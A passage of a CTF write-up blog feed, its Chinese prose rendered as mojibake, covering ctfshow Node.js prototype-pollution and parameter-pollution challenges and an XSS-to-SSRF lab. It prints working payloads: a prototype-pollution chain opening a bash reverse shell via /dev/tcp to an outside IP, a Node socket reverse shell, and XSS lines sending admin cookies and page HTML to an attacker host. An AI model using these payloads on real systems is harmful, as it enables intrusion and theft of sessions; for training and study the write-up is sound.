srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>emmmï¼Œåˆ°è¿™ï¼Œå…¶å®ä¸€å¼€å§‹å°±çŠ¯äº†ä¸ªå¾ˆè ¢çš„é”™ã€‚ã€‚ã€‚å…¶å®ä¸€å¼€å§‹å°±åº”è¯¥æ±¡æŸ“ <code>line</code> å…ˆçš„ï¼Œç„¶ååœ¨è¯• <code>compileDebug</code>ã€<code>type</code>ã€<code>self</code>ï¼Œè ¢å“­äº†ï¼Œï¼Œå› ä¸ºï¼Œå¦‚æœä¸æ±¡æŸ“ line å…ˆçš„è¯ï¼Œä¸èƒ½ä¿è¯åœ¨ line æ­£ç¡®çš„æƒ…å†µä¸‹è¯•å…¶ä»–çš„ï¼Œå°±ä¼šå¯¼è‡´ï¼Œï¼Œå…¶ä»–å¯¹äº†ï¼ŒåŠ ä¸Š <code>line</code> å°±é”™äº†ã€‚ã€‚</p><p>å…¶å®è¿™é‡Œï¼Œå‹æ ¹å°±ä¸ç”¨æ±¡æŸ“ <code>title</code>ï¼Œå¦‚æœæ˜¯ å…ˆæ±¡æŸ“ <code>line</code>ï¼Œç„¶ååˆ° <code>compileDebug</code>ã€<code>type</code>ã€<code>self</code> ä¼šå‘ç°ï¼Œåˆ° <code>self</code> è¿™å°±å¯ä»¥æˆåŠŸåå¼¹ shell äº†ï¼Œäººéƒ½å‚»äº†ã€‚ã€‚ã€‚</p><p>æœ€ç»ˆ EXP</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/119.28.15.55/2233 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135415450-1fa60022-1025-4b8b-be41-7b50e9b9063d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135415450-1fa60022-1025-4b8b-be41-7b50e9b9063d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¸ç”¨å˜ï¼Œåœ¨POSTä¸€æ¬¡å³å¯</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135362376-428be533-bf5a-467c-b3b3-7fced3de7f4c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135362376-428be533-bf5a-467c-b3b3-7fced3de7f4c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>åŸæœ¬æƒ³ç”¨åŸç”ŸSocketçš„ï¼Œä¸çŸ¥é“ä¸ºå•¥è€æ˜¯æŠ¥é”™ï¼Œå¥‡æ€ªï¼Œï¼Œéš¾é“é—­åˆä¸äº†ï¼Ÿ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620141995611-25ddf749-f50f-40f4-ba96-34d74fe24347.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620141995611-25ddf749-f50f-40f4-ba96-34d74fe24347.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;æœåŠ¡å™¨IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="web343-åŸå‹é“¾æ±¡æŸ“"><a href="#web343-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web343 åŸå‹é“¾æ±¡æŸ“ +++++"></a>web343 åŸå‹é“¾æ±¡æŸ“ +++++</h2><p>è¯´æœ‰è¿‡æ»¤ï¼Œä½† web342ä¸€æ ·çš„ EXP ä¹Ÿå¯ä»¥æ‰“ï¼Œåå¼¹shellåçœ‹æºç æ‰å‘ç°ç¡®å®å¤šäº†ç‚¹ä¸œè¥¿</p><p>login.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.userinfo = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.isVIP = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAuthor = <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">JSON</span>.stringify(req.body).match(<span class="regexp">/Text/ig</span>))&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;hacker go away&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    utils.copy(user.userinfo,req.body);</span><br><span class="line">    <span class="keyword">if</span>(user.userinfo.isAdmin)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>emmm æœ‰ç‚¹ä¸æ‡‚è¿™ä¸ª <code>JSON.stringify(req.body).match(/Text/ig)</code> è¿‡æ»¤æœ‰å•¥æ„ä¹‰å°±æ˜¯äº†ã€‚ã€‚</p><p>å’Œweb342ä¸€æ ·çš„EXP</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135724797-e3a69e4c-e35c-45cb-8b3b-f009b7bf5875.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135724797-e3a69e4c-e35c-45cb-8b3b-f009b7bf5875.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135705117-aeeaaedf-c741-4609-b7b8-6deeeb29c7ae.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135705117-aeeaaedf-c741-4609-b7b8-6deeeb29c7ae.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web344-HPP"><a href="#web344-HPP" class="headerlink" title="web344 HPP"></a>web344 HPP</h2><p>ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.url.match(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="built_in">JSON</span>.parse(req.query.query);</span><br><span class="line">  <span class="keyword">if</span>(query.name===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.password===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.isVIP===<span class="literal">true</span>)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å³ url ä¸­ä¸èƒ½åŒ…å«å¤§å°å†™ <code>8c</code>ã€<code>2c</code> å’Œ <code>é€—å·</code></p><p>å…ˆæ„é€ ä¸€ä¸ªæ­£å¸¸è¯·æ±‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°é¢˜ç›®ä¼šè¿‡æ»¤æ‰é€—å·ï¼Œå°è¯• URL ç¼–ç ï¼Œ <code>urlencode(&quot;,&quot;) = %2c</code> å‘ç° <code>2c</code> ä¹Ÿè¢«è¿‡æ»¤</p><p>HTTPåè®®ä¸­å…è®¸åŒåå‚æ•°å‡ºç°å¤šæ¬¡ï¼Œä¸åŒæœåŠ¡ç«¯å¯¹åŒåå‚æ•°å¤„ç†éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸‹é¢é“¾æ¥åˆ—ä¸¾äº†ä¸€äº›</p><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p><p>nodejs ä¼šæŠŠåŒåå‚æ•°ä»¥æ•°ç»„çš„å½¢å¼å­˜å‚¨ï¼Œå¹¶ä¸” <code>JSON.parse</code> å¯ä»¥æ­£å¸¸è§£æã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620111020476-d1326765-9e08-4ca0-91a0-843108b9d1a7.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620111020476-d1326765-9e08-4ca0-91a0-843108b9d1a7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å› æ­¤æ„é€ </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠ cè¿›è¡Œurlç¼–ç ï¼Œæ˜¯å› ä¸º åŒå¼•å· çš„urlç¼–ç æ˜¯ <code>%22</code>ï¼Œå’Œ <code>c</code> è¿æ¥èµ·æ¥å°±æ˜¯ <code>%22c</code>ï¼Œä¼šåŒ¹é…åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620110431999-899531ed-35db-4397-b93a-2e8bbee72029.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620110431999-899531ed-35db-4397-b93a-2e8bbee72029.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><hr><p><strong>ä¸€äº›å‚è€ƒçš„é¢˜è§£</strong></p><div class="note link green"><p><a href="https://blog.csdn.net/solitudi/article/details/111669500">https://blog.csdn.net/solitudi/article/details/111669500</a> <a href="https://blog.csdn.net/miuzzx/article/details/111780832">https://blog.csdn.net/miuzzx/article/details/111780832</a></p></div><div class="note link green"><p><a href="http://www.babyitellyou.com/details?id=60669eee0a6c6440e0560f2d">http://www.babyitellyou.com/details?id=60669eee0a6c6440e0560f2d</a></p></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctfshow </category>
          
          <category> ctfç»ƒä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctfshow </tag>
            
            <tag> ctfç»ƒä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS &amp; SSRFç»„åˆæ‹³</title>
      <link href="2021/04/26/xssrf/"/>
      <url>2021/04/26/xssrf/</url>
      
        <content type="html"><![CDATA[<p>å»å¹´å®ä¹ ä¸­å°±é‡åˆ°ä¸€ä¸ªåœºæ™¯ï¼Œç”¨ xss å»æ‰“ redisï¼Œæƒ³ç€åˆ·åˆ·é¶åœºç»ƒä¹ ä¸€ä¸‹ï¼Œç„¶åå°±åœ¨æ”¶è—å¤¹åƒäº†ä¸€å¹´çš„ç°äº†ã€‚ã€‚</p><p><a href="https://xssrf.hackme.inndy.tw/">https://xssrf.hackme.inndy.tw/</a></p><p>å³ä¸‹é¢é“¾æ¥çš„ 38 - 40 é¢˜</p><p><a href="https://hackme.inndy.tw/scoreboard">https://hackme.inndy.tw/scoreboard</a></p><p>æ‰«æä¸€ä¸‹ç›®å½•ï¼Œå‘ç° robots.txt é‡Œæœ‰ä¸‰æ¡ä¿¡æ¯</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /config.php</span><br><span class="line">Disallow: /you/cant/read/config.php/can/you?</span><br><span class="line">Disallow: /backup.zip</span><br></pre></td></tr></table></figure><p>å‘ç° backup.zip æœ‰å¯†ç æ‰“ä¸å¼€</p><h2 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a>xssme</h2><p>éšä¾¿ç”¨ä¸ªå¸å·æ³¨å†Œç™»å½•ä¸€ä¸‹ï¼Œåœ¨ Mailbox æ”¶åˆ°ç®¡ç†å‘˜å‘æ¥çš„é‚®ä»¶</p><blockquote><p>I am admin from this website, I will read all your mails but never reply.</p></blockquote><p>ä¹Ÿå°±æ˜¯ä¼šä¸€ç›´è¯»æˆ‘å‘çš„é‚®ä»¶ï¼Œä½†æ˜¯ä¸ä¼šå›å¤ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å›æ˜¾ã€‚</p><p>ç›´æ¥ä¸Š payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨ <code>svg/onload</code> æ˜¯ä¸ºäº†ç»•è¿‡ç©ºæ ¼é™åˆ¶</p><p><img src="/img/xssrf/image-20210426140240792.png" class="lazyload" data-srcset="/img/xssrf/image-20210426140240792.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426140240792"></p><p>å¯ä»¥æ­£å¸¸é€šä¿¡</p><p><img src="/img/xssrf/image-20210426104532271.png" class="lazyload" data-srcset="/img/xssrf/image-20210426104532271.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426104532271"></p><p>è·å–ç®¡ç†å‘˜ Cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/xssrf/image-20210426140353791.png" class="lazyload" data-srcset="/img/xssrf/image-20210426140353791.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426140353791"></p><p>å¥‡æ€ªï¼Œæ¥æ”¶ä¸åˆ°</p><p><img src="/img/xssrf/image-20210426105959581.png" class="lazyload" data-srcset="/img/xssrf/image-20210426105959581.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426105959581"></p><p>ä½†é€šè¿‡å¯¼èˆªæ  Sent Mail å¯ä»¥è·å–è‡ªå·±çš„ã€‚ã€‚ã€‚è¯•è¯•é€šè¿‡æ¥æ”¶å¹³å°æ¥æ¥æ”¶ </p><p><a href="http://ceye.io/">http://ceye.io/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://c6i7bf.ceye.io/&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><p>åªæœ‰ dns è§£æè®°å½•ï¼Œæ²¡æœ‰ http è¯·æ±‚è®°å½•ã€‚ã€‚XSSå¹³å°Cookieå­—æ®µä¸ºç©ºã€‚ã€‚ã€‚</p><p>å¥‡æ€ªäº†ï¼Œç„¶åè¯•è¯•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cooki&quot;&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°è¿”å›æ­£å¸¸ï¼Œéš¾é“ï¼Œè¿‡æ»¤äº†cookieå…³é”®å­—ï¼Ÿæˆ–è€…ï¼Œï¼ŒCookieé‡Œçš„ç‰¹æ®Šå­—æ®µå¯¼è‡´ HTTPåŒ…å¼‚å¸¸ï¼Ÿå°è¯•å¯¹è·å–åˆ°çš„ cookie è¿›è¡Œç¼–ç ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>ä¸ºå•¥ç”¨ <code>btoa</code> å‘¢ï¼Œå› ä¸ºä¸€å¼€å§‹è¯•è¿‡äº† <code>escape</code> ä¸è¿‡æ²¡ç”¨â€¦ <code>escape</code> å Cookieé‡Œä¹Ÿæ²¡ç©ºæ ¼çš„æ ·å­emmm</p></blockquote><p>å› ä¸ºé¢˜ç›®è¿‡æ»¤äº† <code>)</code> ï¼Œæ‰€ä»¥éœ€è¦HTMLç¼–ç ä¸€ä¸‹åŒå¼•å·é‡Œé¢çš„ã€‚</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p><img src="/img/xssrf/image-20210426135624410.png" class="lazyload" data-srcset="/img/xssrf/image-20210426135624410.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426135624410"></p><p>å¥½è€¶ï¼</p><p><img src="/img/xssrf/image-20210426135720662.png" class="lazyload" data-srcset="/img/xssrf/image-20210426135720662.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426135720662"></p><p><img src="/img/xssrf/image-20210426140635038.png" class="lazyload" data-srcset="/img/xssrf/image-20210426140635038.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426140635038"></p><p>ç¬¬ä¸€ä¸ªflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#125;</span><br></pre></td></tr></table></figure><p>å¹¶æç¤ºäº†ç¬¬äºŒä¸ª flag åœ¨ redis é‡Œ</p><h2 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a>xssrf leak</h2><p>å°è¯•ç”¨ xssme å¾—åˆ°çš„ admin cookie ï¼Œå°è¯• XFF ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><p><img src="/img/xssrf/image-20210426142206757.png" class="lazyload" data-srcset="/img/xssrf/image-20210426142206757.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426142206757"></p><p>è¿™é‡Œå…ˆè¯»ä¸€ä¸‹ admin é¡µé¢</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure><p>åŒæ ·å¼•å·é‡Œçš„ä¸œè¥¿HTMLç¼–ç ä¸€ä¸‹ç»™ç®¡ç†å‘˜å‘é‚®ä»¶</p><p><img src="/img/xssrf/image-20210426145107589.png" class="lazyload" data-srcset="/img/xssrf/image-20210426145107589.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426145107589"></p><p>æ­£å¸¸æ”¶åˆ°</p><p><img src="/img/xssrf/image-20210426145140680.png" class="lazyload" data-srcset="/img/xssrf/image-20210426145140680.png" 